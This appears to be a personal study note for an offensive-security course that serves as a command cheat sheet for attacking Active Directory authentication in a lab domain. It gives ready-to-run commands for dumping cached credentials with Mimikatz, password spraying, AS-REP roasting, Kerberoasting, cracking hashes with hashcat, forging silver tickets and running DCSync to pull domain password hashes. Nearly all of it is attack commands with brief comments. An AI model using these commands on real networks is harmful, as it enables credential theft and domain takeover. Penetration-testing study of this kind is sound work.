
| [[11 Active Directory-Authentication\|Active Directory: Authentication]] | [[11 Active Directory-Authentication#Cached AD Credentials\|Cached AD Credentials]] | [[11 Active Directory-Authentication#Password Attacks\|Password Attacks]] | [[11 Active Directory-Authentication#AS-REP Roasting\|AS-REP Roasting]] |
| --------------------------------------------------------------------- | -------------------------------------------------------------------------------- | ---------------------------------------------------------------------- | -------------------------------------------------------------------- |
| [[11 Active Directory-Authentication#Kerberoasting\|Kerberoasting]]      | [[11 Active Directory-Authentication#Silver Tickets\|Silver Tickets]]               | [[11 Active Directory-Authentication#DCSync Attack\|DCSync Attack]]       |                                                                      |
## Cached AD Credentials
```shell
# Run PowerShell as Admin, Run Mimikatz with standard setup
PS C:\Users\stephanie> .\mimikatz.exe
mimikatz> privilege::debug

# Dump credentials of all logged-on users
mimikatz> sekurlsa::logonpasswords

# Send a SMB request to cache a service ticket
PS C:\Users\stephanie> dir \\web04.corp.com\backup

# Check mimikatz to show ticket (abused later)
mimikatz> sekurlsa::tickets
```

## Password Attacks
```shell
# View account policy
PS C:\Users\stephanie> net accounts
# Lockout Threshold = N-1 times before triggering lockout
# Lockout observation window = N minutes before additional attempts (should reset)

# Password Spraying Attack with PS Script
PS C:\Users\stephanie> powershell -ep bypass
PS C:\Users\stephanie> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin

# Password Spraying Attack on SMB with crackmapexec
kali@kali:~$ crackmapexec smb <TARGET_IP> -u <USER/USERLIST.txt> -p "Nexus123!" -d corp.com --continue-on-success
# If (Pwned!), user has admin priv

# Password Spraying Attack with Kerbrute (cross-platform)
PS C:\Users\stephanie> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

# Other functions of Kerbrute
kali@kali:~$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

kali@kali:~$ ./kerbrute_linux_amd64 userenum /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt --dc <dc-ip> --domain <domain>

kali@kali:~$ ./kerbrute_linux_amd64 userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc <dc-ip> --domain <domain>

```
## AS-REP Roasting
```shell
# AS-REP on Kali with impacket-GetNPUsers
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.149.70 -request -outputfile hashes.asreproast corp.com/pete
# use domain controller IP, target must be in domain/user format, with password prompted after

# AS=REP Roasting on Windows with Rubeus
PS C:\Users\stephanie> .\Rubeus.exe asreproast /nowrap
# Automatically identifies vulnerable user accounts

# Use hashcat to crack the AS-REP hash
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Manually identify users without Kerberos Preauth
PS C:\Users\stephanie> powershell -e bypass
PS C:\Users\stephanie> Import-Module .\PowerView.ps1
PS C:\Users\stephanie> Get-Domainuser -PreauthNotRequired | select name

# Manually idenitfy users without Kerberos Preauth (on Kali)
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.149.70 corp.com/pete

# If current user has GenericWrite or GenericAll on other AD accounts, can use to reset passwords or modify UAC value to not require Kerberos Preauth
```
## Kerberoasting
```shell
# Kerberoasting using Rubeus (Windows)
PS C:\Users\stephanie> .\Rebeus.exe kerberoast /outfile:hashes.kerberoast
# Will automatically identify all SPNs linked with domain user e.g. iis_service

# Kerberoasting using impacket-GetUserSPNs (Kali)
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.149.70 -outputfile hashes.kerberoast corp.com/pete
# use domain controller IP, if error Clock skew too great, sync time of Kali machine to the DC using ntpdate or rdate

# Crack the TGS-REP hash with hashcat
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# If current user has GenericWrite/GenericAll on other AD accounts, we can set an SPN for a target user, kerberoast the account and crack the password hash (Targeted Kerberoasting)
```
## Silver Tickets
```shell
# Requires: SPN Password Hash, Domain SID, Target SPN
# Get iis_service user's NTLM hash via Mimikatz
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords

# Get domain SID (can take from previous output)
PS C:\Users\jeff> whoami /user
# Omit RID of the user (last - onwards)

# Create silver ticket with Mimikatz
mimikatz> kerberos::golden /sid:<DOMAIN_SID> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<SPN_NTLM_HASH> /user:jeffadmin
# use existing domain user with permissions to copy/impersonate

# Verify ticket in memory
PS C:\Users\stephanie> klist

# Attempt access e.g. websvr
PS C:\Users\stephanie> iwr -UseDefaultCredentials http://web04
```
## DCSync Attack
```shell
# Use mimikatz to run dcsync attack to fetch NTLM hash (Requires Admin)
mimikatz> lsadump::dcsync /user:corp/dave
# Able to obtain any user password hash in the domain, even Administrator

# DCSync attack on Kali using impacket-secretsdump
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"PASSWORD"@192.168.149.70
# -just-dc-user = Target username
# Credential format = domain/user:password@DC_IP
```